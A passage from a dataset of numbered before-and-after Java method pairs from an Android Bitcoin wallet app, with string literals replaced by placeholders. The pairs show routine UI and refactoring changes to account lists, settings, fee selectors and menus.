    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}"
91021,"void initExternalSettings(){
  final PreferenceCategory external=(PreferenceCategory)findPreference(""String_Node_Str"");
  final List<BuySellServiceDescriptor> buySellServices=_mbwManager.getEnvironmentSettings().getBuySellServices();
  for (  final BuySellServiceDescriptor buySellService : buySellServices) {
    if (!buySellService.showEnableInSettings()) {
      continue;
    }
    final CheckBoxPreference cbService=new CheckBoxPreference(this);
    final String enableTitle=getResources().getString(R.string.settings_service_enabled,getResources().getString(buySellService.title));
    cbService.setTitle(enableTitle);
    cbService.setSummary(buySellService.settingDescription);
    cbService.setChecked(buySellService.isEnabled(_mbwManager));
    cbService.setWidgetLayoutResource(R.layout.preference_checkbox);
    cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
      @Override public boolean onPreferenceClick(      Preference preference){
        CheckBoxPreference p=(CheckBoxPreference)preference;
        buySellService.setEnabled(_mbwManager,p.isChecked());
        return true;
      }
    }
);
    external.addPreference(cbService);
  }
  final CheckBoxPreference cbService=new CheckBoxPreference(this);
  cbService.setTitle(R.string.settings_mydfs_title);
  cbService.setSummary(R.string.settings_mydfs_summary);
  cbService.setChecked(SettingsPreference.getInstance().isMyDFSEnabled());
  cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
    @Override public boolean onPreferenceClick(    Preference preference){
      CheckBoxPreference p=(CheckBoxPreference)preference;
      SettingsPreference.getInstance().setEnableMyDFS(p.isChecked());
      return true;
    }
  }
);
  external.addPreference(cbService);
}","void initExternalSettings(){
  final PreferenceCategory external=(PreferenceCategory)findPreference(""String_Node_Str"");
  final List<BuySellServiceDescriptor> buySellServices=_mbwManager.getEnvironmentSettings().getBuySellServices();
  for (  final BuySellServiceDescriptor buySellService : buySellServices) {
    if (!buySellService.showEnableInSettings()) {
      continue;
    }
    final CheckBoxPreference cbService=new CheckBoxPreference(this);
    final String enableTitle=getResources().getString(R.string.settings_service_enabled,getResources().getString(buySellService.title));
    cbService.setTitle(enableTitle);
    cbService.setSummary(buySellService.settingDescription);
    cbService.setChecked(buySellService.isEnabled(_mbwManager));
    cbService.setWidgetLayoutResource(R.layout.preference_checkbox);
    cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
      @Override public boolean onPreferenceClick(      Preference preference){
        CheckBoxPreference p=(CheckBoxPreference)preference;
        buySellService.setEnabled(_mbwManager,p.isChecked());
        return true;
      }
    }
);
    external.addPreference(cbService);
  }
  final CheckBoxPreference cbService=new CheckBoxPreference(this);
  cbService.setTitle(R.string.settings_mydfs_title);
  cbService.setSummary(R.string.settings_mydfs_summary);
  cbService.setChecked(SettingsPreference.getInstance().isMyDFSEnabled());
  cbService.setWidgetLayoutResource(R.layout.preference_checkbox);
  cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
    @Override public boolean onPreferenceClick(    Preference preference){
      CheckBoxPreference p=(CheckBoxPreference)preference;
      SettingsPreference.getInstance().setEnableMyDFS(p.isChecked());
      return true;
    }
  }
);
  external.addPreference(cbService);
}"
91022,"void initExternalSettings(){
  final PreferenceCategory external=(PreferenceCategory)findPreference(""String_Node_Str"");
  final List<BuySellServiceDescriptor> buySellServices=_mbwManager.getEnvironmentSettings().getBuySellServices();
  for (  final BuySellServiceDescriptor buySellService : buySellServices) {
    if (!buySellService.showEnableInSettings()) {
      continue;
    }
    final CheckBoxPreference cbService=new CheckBoxPreference(this);
    final String enableTitle=getResources().getString(R.string.settings_service_enabled,getResources().getString(buySellService.title));
    cbService.setTitle(enableTitle);
    cbService.setSummary(buySellService.settingDescription);
    cbService.setChecked(buySellService.isEnabled(_mbwManager));
    cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
      @Override public boolean onPreferenceClick(      Preference preference){
        CheckBoxPreference p=(CheckBoxPreference)preference;
        buySellService.setEnabled(_mbwManager,p.isChecked());
        return true;
      }
    }
);
    external.addPreference(cbService);
  }
}","void initExternalSettings(){
  final PreferenceCategory external=(PreferenceCategory)findPreference(""String_Node_Str"");
  final List<BuySellServiceDescriptor> buySellServices=_mbwManager.getEnvironmentSettings().getBuySellServices();
  for (  final BuySellServiceDescriptor buySellService : buySellServices) {
    if (!buySellService.showEnableInSettings()) {
      continue;
    }
    final CheckBoxPreference cbService=new CheckBoxPreference(this);
    final String enableTitle=getResources().getString(R.string.settings_service_enabled,getResources().getString(buySellService.title));
    cbService.setTitle(enableTitle);
    cbService.setSummary(buySellService.settingDescription);
    cbService.setChecked(buySellService.isEnabled(_mbwManager));
    cbService.setWidgetLayoutResource(R.layout.preference_checkbox);
    cbService.setOnPreferenceClickListener(new OnPreferenceClickListener(){
      @Override public boolean onPreferenceClick(      Preference preference){
        CheckBoxPreference p=(CheckBoxPreference)preference;
        buySellService.setEnabled(_mbwManager,p.isChecked());
        return true;
      }
    }
);
    external.addPreference(cbService);
  }
}"
91023,"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  if (getItemViewType(position) == BUTTON) {
    final ActionButton actionButton=buttons.get(position);
    Button button=((ButtonHolder)holder).button;
    button.setText(actionButton.text);
    button.setCompoundDrawablesWithIntrinsicBounds(actionButton.icon,0,0,0);
    if (actionButton.textColor != 0) {
      button.setTextColor(actionButton.textColor);
    }
    if (actionButton.icon != 0) {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
    button.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (actionButton.task != null) {
          actionButton.task.run();
        }
      }
    }
);
  }
 else {
    Paint paint=new Paint();
    float textSize=TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_SP,17,holder.itemView.getResources().getDisplayMetrics());
    paint.setTextSize(textSize);
    String text;
    if (position == 0) {
      text=buttons.get(1).text;
    }
 else {
      text=buttons.get(buttons.size() - 2).text;
    }
    int width=(int)paint.measureText(text);
    int paddings=(int)TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,58,holder.itemView.getResources().getDisplayMetrics());
    ViewGroup.LayoutParams layoutParams=holder.itemView.getLayoutParams();
    layoutParams.width=(holder.itemView.getResources().getDisplayMetrics().widthPixels - width - paddings) / 2;
  }
}","@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  if (getItemViewType(position) == BUTTON) {
    final ActionButton actionButton=buttons.get(position);
    Button button=((ButtonHolder)holder).button;
    button.setText(actionButton.text);
    button.setCompoundDrawablesWithIntrinsicBounds(actionButton.icon,0,0,0);
    if (actionButton.textColor != 0) {
      button.setTextColor(actionButton.textColor);
    }
    if (actionButton.icon != 0) {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
 else {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding_large),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
    button.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (actionButton.task != null) {
          actionButton.task.run();
        }
      }
    }
);
  }
 else {
    Paint paint=new Paint();
    float textSize=TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_SP,17,holder.itemView.getResources().getDisplayMetrics());
    paint.setTextSize(textSize);
    String text;
    if (position == 0) {
      text=buttons.get(1).text;
    }
 else {
      text=buttons.get(buttons.size() - 2).text;
    }
    int width=(int)paint.measureText(text);
    int paddings=(int)TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,58,holder.itemView.getResources().getDisplayMetrics());
    ViewGroup.LayoutParams layoutParams=holder.itemView.getLayoutParams();
    layoutParams.width=(holder.itemView.getResources().getDisplayMetrics().widthPixels - width - paddings) / 2;
  }
}"
91024,"private void startExchange(Intent intent){
  final ExchangeRate exchangeRate=_mbwManager.getExchangeRateManager().getExchangeRate(""String_Node_Str"");
  if (exchangeRate == null || exchangeRate.price == null) {
    new AlertDialog.Builder(getActivity()).setMessage(R.string.exchange_service_unavailable).setPositiveButton(R.string.button_ok,null).create().show();
    _mbwManager.getExchangeRateManager().requestRefresh();
  }
 else {
    startActivity(intent);
  }
}","private void startExchange(Intent intent){
  startActivity(intent);
}"
91025,"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  if (getItemViewType(position) == BUTTON) {
    final ActionButton actionButton=buttons.get(position);
    Button button=((ButtonHolder)holder).button;
    button.setText(actionButton.text);
    button.setCompoundDrawablesWithIntrinsicBounds(actionButton.icon,0,0,0);
    if (actionButton.textColor != 0) {
      button.setTextColor(actionButton.textColor);
    }
    if (actionButton.icon != 0) {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
    button.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (actionButton.task != null) {
          actionButton.task.run();
        }
      }
    }
);
  }
 else {
    Paint paint=new Paint();
    float textSize=TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_SP,17,holder.itemView.getResources().getDisplayMetrics());
    paint.setTextSize(textSize);
    String text;
    if (position == 0) {
      text=buttons.get(1).text;
    }
 else {
      text=buttons.get(buttons.size() - 2).text;
    }
    int width=(int)paint.measureText(text);
    int paddings=(int)TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,58,holder.itemView.getResources().getDisplayMetrics());
    ViewGroup.LayoutParams layoutParams=holder.itemView.getLayoutParams();
    layoutParams.width=(holder.itemView.getResources().getDisplayMetrics().widthPixels - width - paddings) / 2;
  }
}","@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
  if (getItemViewType(position) == BUTTON) {
    final ActionButton actionButton=buttons.get(position);
    Button button=((ButtonHolder)holder).button;
    button.setText(actionButton.text);
    button.setCompoundDrawablesWithIntrinsicBounds(actionButton.icon,0,0,0);
    if (actionButton.textColor != 0) {
      button.setTextColor(actionButton.textColor);
    }
    if (actionButton.icon != 0) {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
 else {
      button.setPadding(button.getResources().getDimensionPixelSize(R.dimen.button_padding_large),button.getPaddingTop(),button.getPaddingRight(),button.getPaddingBottom());
    }
    button.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (actionButton.task != null) {
          actionButton.task.run();
        }
      }
    }
);
  }
 else {
    Paint paint=new Paint();
    float textSize=TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_SP,17,holder.itemView.getResources().getDisplayMetrics());
    paint.setTextSize(textSize);
    String text;
    if (position == 0) {
      text=buttons.get(1).text;
    }
 else {
      text=buttons.get(buttons.size() - 2).text;
    }
    int width=(int)paint.measureText(text);
    int paddings=(int)TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,58,holder.itemView.getResources().getDisplayMetrics());
    ViewGroup.LayoutParams layoutParams=holder.itemView.getLayoutParams();
    layoutParams.width=(holder.itemView.getResources().getDisplayMetrics().widthPixels - width - paddings) / 2;
  }
}"
91026,"private void initFeeLvlView(){
  feeLvlList.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  List<MinerFee> fees=Arrays.asList(MinerFee.values());
  List<FeeLvlItem> feeLvlItems=new ArrayList<>();
  feeLvlItems.add(new FeeLvlItem(null,null,SelectableRecyclerView.Adapter.VIEW_TYPE_PADDING));
  for (  MinerFee fee : fees) {
    String duration=Utils.formatBlockcountAsApproxDuration(this,fee.getNBlocks());
    feeLvlItems.add(new FeeLvlItem(fee,""String_Node_Str"" + duration,SelectableRecyclerView.Adapter.VIEW_TYPE_ITEM));
  }
  feeLvlItems.add(new FeeLvlItem(null,null,SelectableRecyclerView.Adapter.VIEW_TYPE_PADDING));
  final FeeLvlViewAdapter feeLvlViewAdapter=new FeeLvlViewAdapter(feeLvlItems,feeFirstItemWidth);
  feeLvlList.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      FeeLvlItem item=((FeeLvlViewAdapter)adapter).getItem(position);
      feeLvl=item.minerFee;
      feePerKbValue=feeLvl.getFeePerKb(feeEstimation).getLongValue();
      _transactionStatus=tryCreateUnsignedTransaction();
      List<FeeItem> feeItems=feeItemsBuilder.getFeeItemList(feeLvl,estimateTxSize());
      feeViewAdapter.setDataset(feeItems);
      feeValueList.setSelectedItem(new FeeItem(feePerKbValue,null,null,FeeViewAdapter.VIEW_TYPE_ITEM));
    }
  }
);
  feeLvlList.setAdapter(feeLvlViewAdapter);
  int selectedIndex=-1;
  for (int i=0; i < feeLvlItems.size(); i++) {
    FeeLvlItem feeLvlItem=feeLvlItems.get(i);
    if (feeLvlItem.minerFee == _mbwManager.getMinerFee()) {
      selectedIndex=i;
      break;
    }
  }
  feeLvlList.setSelectedItem(selectedIndex);
  feeLvlList.setHasFixedSize(true);
}","private void initFeeLvlView(){
  feeLvlList.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  feeLvlList.setHasFixedSize(true);
  List<MinerFee> fees=Arrays.asList(MinerFee.values());
  List<FeeLvlItem> feeLvlItems=new ArrayList<>();
  feeLvlItems.add(new FeeLvlItem(null,null,SelectableRecyclerView.Adapter.VIEW_TYPE_PADDING));
  for (  MinerFee fee : fees) {
    String duration=Utils.formatBlockcountAsApproxDuration(this,fee.getNBlocks());
    feeLvlItems.add(new FeeLvlItem(fee,""String_Node_Str"" + duration,SelectableRecyclerView.Adapter.VIEW_TYPE_ITEM));
  }
  feeLvlItems.add(new FeeLvlItem(null,null,SelectableRecyclerView.Adapter.VIEW_TYPE_PADDING));
  final FeeLvlViewAdapter feeLvlViewAdapter=new FeeLvlViewAdapter(feeLvlItems,feeFirstItemWidth);
  feeLvlList.setAdapter(feeLvlViewAdapter);
  int selectedIndex=-1;
  for (int i=0; i < feeLvlItems.size(); i++) {
    FeeLvlItem feeLvlItem=feeLvlItems.get(i);
    if (feeLvlItem.minerFee == _mbwManager.getMinerFee()) {
      selectedIndex=i;
      break;
    }
  }
  feeLvlList.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      FeeLvlItem item=((FeeLvlViewAdapter)adapter).getItem(position);
      feeLvl=item.minerFee;
      feePerKbValue=feeLvl.getFeePerKb(feeEstimation).getLongValue();
      _transactionStatus=tryCreateUnsignedTransaction();
      List<FeeItem> feeItems=feeItemsBuilder.getFeeItemList(feeLvl,estimateTxSize());
      feeViewAdapter.setDataset(feeItems);
      feeValueList.setSelectedItem(new FeeItem(feePerKbValue,null,null,FeeViewAdapter.VIEW_TYPE_ITEM));
    }
  }
);
  feeLvlList.setSelectedItem(selectedIndex);
}"
91027,"private void initFeeView(){
  feeValueList.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  feeViewAdapter=new FeeViewAdapter(feeFirstItemWidth);
  feeItemsBuilder=new FeeItemsBuilder(_mbwManager);
  feeValueList.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      FeeItem item=((FeeViewAdapter)adapter).getItem(position);
      feePerKbValue=item.feePerKb;
      updateRecipient();
      checkHaveSpendAccount();
      updateAmount();
      updateFeeText();
      updateError();
      btSend.setEnabled(_transactionStatus == TransactionStatus.OK);
      ScrollView scrollView=(ScrollView)findViewById(R.id.root);
      if (showSendBtn && scrollView.getMaxScrollAmount() - scrollView.getScaleY() > 0) {
        scrollView.smoothScrollBy(0,scrollView.getMaxScrollAmount());
        showSendBtn=false;
      }
    }
  }
);
  feeValueList.setAdapter(feeViewAdapter);
  feeValueList.setHasFixedSize(true);
}","private void initFeeView(){
  feeValueList.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  feeValueList.setHasFixedSize(true);
  feeViewAdapter=new FeeViewAdapter(feeFirstItemWidth);
  feeItemsBuilder=new FeeItemsBuilder(_mbwManager);
  feeValueList.setAdapter(feeViewAdapter);
  feeValueList.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      FeeItem item=((FeeViewAdapter)adapter).getItem(position);
      feePerKbValue=item.feePerKb;
      updateRecipient();
      checkHaveSpendAccount();
      updateAmount();
      updateFeeText();
      updateError();
      btSend.setEnabled(_transactionStatus == TransactionStatus.OK);
      ScrollView scrollView=findViewById(R.id.root);
      if (showSendBtn && scrollView.getMaxScrollAmount() - scrollView.getScaleY() > 0) {
        scrollView.smoothScrollBy(0,scrollView.getMaxScrollAmount());
        showSendBtn=false;
      }
    }
  }
);
}"
91028,"@Override public void onBindViewHolder(FeeLvlViewAdapter.ViewHolder holder,int position){
  super.onBindViewHolder(holder,position);
  if (getItemViewType(position) == VIEW_TYPE_ITEM) {
    FeeLvlItem item=mDataset.get(position);
    holder.itemTextView.setText(item.minerFee.getMinerFeeName(holder.itemView.getContext()));
    holder.valueTextView.setText(item.duration);
  }
}","@Override public void onBindViewHolder(FeeLvlViewAdapter.ViewHolder holder,int position){
  super.onBindViewHolder(holder,position);
  if (getItemViewType(position) == VIEW_TYPE_ITEM) {
    FeeLvlItem item=mDataset.get(position);
    holder.itemTextView.setText(item.minerFee.getMinerFeeName(holder.itemView.getContext()));
    holder.valueTextView.setText(item.duration);
  }
 else {
    RecyclerView.LayoutParams layoutParams=(RecyclerView.LayoutParams)holder.itemView.getLayoutParams();
    layoutParams.width=paddingWidth;
    holder.itemView.setLayoutParams(layoutParams);
  }
}"
91029,"@Override public void onBindViewHolder(ViewHolder holder,int position){
  super.onBindViewHolder(holder,position);
  if (getItemViewType(position) == VIEW_TYPE_ITEM) {
    FeeItem item=mDataset.get(position);
    if (item.btc != null) {
      holder.categoryTextView.setText(CoinUtil.valueString(item.btc.getLongValue(),mBTC,true) + ""String_Node_Str"" + mBTC.getUnicodeName());
    }
    if (item.currencyValue != null && item.currencyValue.getValue() != null) {
      holder.itemTextView.setText(""String_Node_Str"" + item.currencyValue.getValue().setScale(2,BigDecimal.ROUND_HALF_DOWN) + ""String_Node_Str""+ item.currencyValue.getCurrency());
    }
    holder.valueTextView.setText(String.valueOf(Math.round(item.feePerKb / 1000f)) + ""String_Node_Str"");
  }
}","@Override public void onBindViewHolder(ViewHolder holder,int position){
  super.onBindViewHolder(holder,position);
  if (getItemViewType(position) == VIEW_TYPE_ITEM) {
    FeeItem item=mDataset.get(position);
    if (item.btc != null) {
      holder.categoryTextView.setText(CoinUtil.valueString(item.btc.getLongValue(),mBTC,true) + ""String_Node_Str"" + mBTC.getUnicodeName());
    }
    if (item.currencyValue != null && item.currencyValue.getValue() != null) {
      holder.itemTextView.setText(""String_Node_Str"" + item.currencyValue.getValue().setScale(2,BigDecimal.ROUND_HALF_DOWN) + ""String_Node_Str""+ item.currencyValue.getCurrency());
    }
    holder.valueTextView.setText(String.valueOf(Math.round(item.feePerKb / 1000f)) + ""String_Node_Str"");
  }
 else {
    RecyclerView.LayoutParams layoutParams=(RecyclerView.LayoutParams)holder.itemView.getLayoutParams();
    layoutParams.width=paddingWidth;
    holder.itemView.setLayoutParams(layoutParams);
  }
}"
91030,"private UUID returnSAAccount(InMemoryPrivateKey key,MetadataStorage.BackupState backupState){
  UUID acc;
  try {
    acc=_mbwManager.getWalletManager(false).createSingleAddressAccount(key,AesKeyCipher.defaultKeyCipher());
    _mbwManager.getMetadataStorage().setIgnoreLegacyWarning(acc,true);
    _mbwManager.getMetadataStorage().setOtherAccountBackupState(acc,backupState);
    return acc;
  }
 catch (  KeyCipher.InvalidKeyCipher invalidKeyCipher) {
    throw new RuntimeException(invalidKeyCipher);
  }
}","private UUID returnSAAccount(InMemoryPrivateKey key,MetadataStorage.BackupState backupState){
  UUID acc;
  try {
    acc=_mbwManager.getWalletManager(false).createSingleAddressAccount(key,AesKeyCipher.defaultKeyCipher());
    _mbwManager.getMetadataStorage().setOtherAccountBackupState(acc,backupState);
    return acc;
  }
 catch (  KeyCipher.InvalidKeyCipher invalidKeyCipher) {
    throw new RuntimeException(invalidKeyCipher);
  }
}"
91031,"@Override public View getView(int position,View convertView,ViewGroup parent){
  LayoutInflater inflater=(LayoutInflater)getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  View row;
  if (convertView == null) {
    row=inflater.inflate(R.layout.record_row,parent,false);
  }
 else {
    row=convertView;
  }
  HdAccountWrapper account=getItem(position);
  ((TextView)row.findViewById(R.id.tvLabel)).setText(account.name);
  WalletAccount walletAccount=MbwManager.getInstance(getContext()).getWalletManager(true).getAccount(account.id);
  Balance balance=walletAccount.getBalance();
  String balanceString=MbwManager.getInstance(getContext()).getBtcValueString(balance.confirmed + balance.pendingChange);
  if (balance.getSendingBalance() > 0) {
    balanceString+=""String_Node_Str"" + String.format(getString(R.string.account_balance_sending_amount),MbwManager.getInstance(getContext()).getBtcValueString(balance.getSendingBalance()));
  }
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,true,getResources());
  ((TextView)row.findViewById(R.id.tvBalance)).setText(balanceString);
  ((TextView)row.findViewById(R.id.tvAddress)).setVisibility(View.GONE);
  ((ImageView)row.findViewById(R.id.ivIcon)).setImageDrawable(drawableForAccount);
  ((TextView)row.findViewById(R.id.tvBackupMissingWarning)).setVisibility(View.GONE);
  return row;
}","@Override public View getView(int position,View convertView,ViewGroup parent){
  LayoutInflater inflater=(LayoutInflater)getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  View row;
  if (convertView == null) {
    row=inflater.inflate(R.layout.record_row,parent,false);
  }
 else {
    row=convertView;
  }
  HdAccountWrapper account=getItem(position);
  ((TextView)row.findViewById(R.id.tvLabel)).setText(account.name);
  WalletAccount walletAccount=MbwManager.getInstance(getContext()).getWalletManager(true).getAccount(account.id);
  Balance balance=walletAccount.getBalance();
  String balanceString=MbwManager.getInstance(getContext()).getBtcValueString(balance.confirmed + balance.pendingChange);
  if (balance.getSendingBalance() > 0) {
    balanceString+=""String_Node_Str"" + String.format(getString(R.string.account_balance_sending_amount),MbwManager.getInstance(getContext()).getBtcValueString(balance.getSendingBalance()));
  }
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,true,getResources());
  ((TextView)row.findViewById(R.id.tvBalance)).setText(balanceString);
  row.findViewById(R.id.tvAddress).setVisibility(View.GONE);
  ((ImageView)row.findViewById(R.id.ivIcon)).setImageDrawable(drawableForAccount);
  row.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  return row;
}"
91032,"private Notice determineNotice(){
  WalletAccount account=_mbwManager.getSelectedAccount();
  MetadataStorage meta=_mbwManager.getMetadataStorage();
  Optional<Integer> resetPinRemainingBlocksCount=_mbwManager.getResetPinRemainingBlocksCount();
  if (resetPinRemainingBlocksCount.isPresent() && resetPinRemainingBlocksCount.get() == 0) {
    return Notice.RESET_PIN_AVAILABLE;
  }
  if (resetPinRemainingBlocksCount.isPresent()) {
    return Notice.RESET_PIN_IN_PROGRESS;
  }
  if (meta.getMasterSeedBackupState() != MetadataStorage.BackupState.VERIFIED) {
    if (account instanceof Bip44Account) {
      return Notice.BACKUP_MISSING;
    }
  }
  if ((account instanceof ColuAccount || account instanceof SingleAddressAccount) && account.canSpend()) {
    MetadataStorage.BackupState state=meta.getOtherAccountBackupState(account.getId());
    if (state == MetadataStorage.BackupState.NOT_VERIFIED) {
      return Notice.SINGLEKEY_VERIFY_MISSING;
    }
 else     if (state != MetadataStorage.BackupState.VERIFIED && state != MetadataStorage.BackupState.IGNORED) {
      return Notice.SINGLEKEY_BACKUP_MISSING;
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    return Notice.MOVE_LEGACY_FUNDS;
  }
  return Notice.NONE;
}","private Notice determineNotice(){
  WalletAccount account=_mbwManager.getSelectedAccount();
  MetadataStorage meta=_mbwManager.getMetadataStorage();
  Optional<Integer> resetPinRemainingBlocksCount=_mbwManager.getResetPinRemainingBlocksCount();
  if (resetPinRemainingBlocksCount.isPresent() && resetPinRemainingBlocksCount.get() == 0) {
    return Notice.RESET_PIN_AVAILABLE;
  }
  if (resetPinRemainingBlocksCount.isPresent()) {
    return Notice.RESET_PIN_IN_PROGRESS;
  }
  if (meta.getMasterSeedBackupState() != MetadataStorage.BackupState.VERIFIED) {
    if (account instanceof Bip44Account) {
      return Notice.BACKUP_MISSING;
    }
  }
  if ((account instanceof ColuAccount || account instanceof SingleAddressAccount) && account.canSpend()) {
    MetadataStorage.BackupState state=meta.getOtherAccountBackupState(account.getId());
    if (state == MetadataStorage.BackupState.NOT_VERIFIED) {
      return Notice.SINGLEKEY_VERIFY_MISSING;
    }
 else     if (state != MetadataStorage.BackupState.VERIFIED && state != MetadataStorage.BackupState.IGNORED) {
      return Notice.SINGLEKEY_BACKUP_MISSING;
    }
  }
  return Notice.NONE;
}"
91033,"private void updateIncludingMenus(){
  WalletAccount account=accountListAdapter.getFocusedAccount();
  boolean isBch=account.getType() == WalletAccount.Type.BCHSINGLEADDRESS || account.getType() == WalletAccount.Type.BCHBIP44;
  final List<Integer> menus=Lists.newArrayList();
  if (!(account instanceof ColuAccount) && !Utils.checkIsLinked(account,_mbwManager.getColuManager().getAccounts().values())) {
    menus.add(R.menu.record_options_menu);
  }
  if ((account instanceof SingleAddressAccount) || (account.isDerivedFromInternalMasterseed())) {
    menus.add(R.menu.record_options_menu_backup);
  }
  if (account instanceof SingleAddressAccount) {
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (account instanceof ColuAccount) {
    menus.add(R.menu.record_options_menu_backup);
    menus.add(R.menu.record_options_menu_backup_verify);
  }
  if (!account.isDerivedFromInternalMasterseed() && !isBch) {
    menus.add(R.menu.record_options_menu_delete);
  }
  if (account.isActive() && account.canSpend() && !(account instanceof Bip44PubOnlyAccount)&& !isBch) {
    menus.add(R.menu.record_options_menu_sign);
  }
  if (account.isActive() && !isBch) {
    menus.add(R.menu.record_options_menu_active);
  }
  if (account.isActive() && !(account instanceof CoinapultAccount) && !isBch) {
    menus.add(R.menu.record_options_menu_outputs);
  }
  if (account instanceof CoinapultAccount) {
    menus.add(R.menu.record_options_menu_set_coinapult_mail);
  }
  if (account.getType() != WalletAccount.Type.BCHBIP44 && account.getType() != WalletAccount.Type.BCHSINGLEADDRESS && account.isArchived()) {
    menus.add(R.menu.record_options_menu_archive);
  }
  if (account.isActive() && account instanceof ExportableAccount && !isBch) {
    menus.add(R.menu.record_options_menu_export);
  }
  if (account.isActive() && account instanceof Bip44Account && !(account instanceof Bip44PubOnlyAccount)&& AccountManager.INSTANCE.getBTCMasterSeedAccounts().size() > 1 && !isBch) {
    if (!((Bip44Account)account).hasHadActivity()) {
      menus.add(R.menu.record_options_menu_hide_unused);
    }
  }
  if (RecordRowBuilder.showLegacyAccountWarning(account,_mbwManager)) {
    menus.add(R.menu.record_options_menu_ignore_warning);
  }
  if (account.getId().equals(_mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    menus.add(R.menu.record_options_menu_detach);
  }
  AppCompatActivity parent=(AppCompatActivity)getActivity();
  Callback actionMode=new Callback(){
    @Override public boolean onCreateActionMode(    ActionMode actionMode,    Menu menu){
      for (      Integer res : menus) {
        actionMode.getMenuInflater().inflate(res,menu);
      }
      return true;
    }
    @Override public boolean onPrepareActionMode(    ActionMode actionMode,    Menu menu){
      return true;
    }
    @Override public boolean onActionItemClicked(    ActionMode actionMode,    MenuItem menuItem){
      if (_mbwManager.getWalletManager(false).getState() == WalletManager.State.SYNCHRONIZING || _mbwManager.getColuManager().getState() == WalletManager.State.SYNCHRONIZING) {
        _toaster.toast(R.string.synchronizing_please_wait,false);
        return true;
      }
      int id=menuItem.getItemId();
      if (id == R.id.miActivate) {
        activateSelected();
        return true;
      }
 else       if (id == R.id.miSetLabel) {
        setLabelOnAccount(accountListAdapter.getFocusedAccount(),""String_Node_Str"",true);
        return true;
      }
 else       if (id == R.id.miDeleteRecord) {
        deleteSelected();
        return true;
      }
 else       if (id == R.id.miArchive) {
        archiveSelected();
        return true;
      }
 else       if (id == R.id.miHideUnusedAccount) {
        hideSelected();
        return true;
      }
 else       if (id == R.id.miExport) {
        exportSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miIgnoreWarnings) {
        ignoreSelectedPrivateKey();
        return true;
      }
 else       if (id == R.id.miSignMessage) {
        signMessage();
        return true;
      }
 else       if (id == R.id.miDetach) {
        detachFromLocalTrader();
        return true;
      }
 else       if (id == R.id.miShowOutputs) {
        showOutputs();
        return true;
      }
 else       if (id == R.id.miMakeBackup) {
        makeBackup();
        return true;
      }
 else       if (id == R.id.miSingleKeyBackupVerify) {
        verifySingleKeyBackup();
        return true;
      }
 else       if (id == R.id.miRescan) {
        rescan();
        return true;
      }
 else       if (id == R.id.miSetMail) {
        setCoinapultMail();
        return true;
      }
 else       if (id == R.id.miVerifyMail) {
        verifyCoinapultMail();
        return true;
      }
